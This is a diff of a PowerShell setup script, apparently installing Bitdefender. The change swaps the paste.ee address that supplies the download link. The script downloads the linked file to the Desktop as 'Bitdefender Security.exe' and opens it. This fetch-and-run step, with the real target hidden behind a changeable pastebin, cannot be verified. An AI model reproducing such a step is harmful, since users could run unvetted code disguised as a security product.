@@ -3,7 +3,7 @@ Invoke-RestMethod "https://raw.githubusercontent.com/Andreas6920/Other/refs/head
 
 Write-host "  Bitdefender:"
 $File = Join-path -Path ([Environment]::GetFolderPath("Desktop")) -Childpath "Bitdefender Security.exe"
-$link = irm https://paste.ee/r/0V3I7aeY
+$link = irm https://paste.ee/r/LZSoJZBq
 Write-host "`t - Downloading.."
 (New-Object net.webclient).Downloadfile($link, $File )
 Write-host "`t - Opening.."
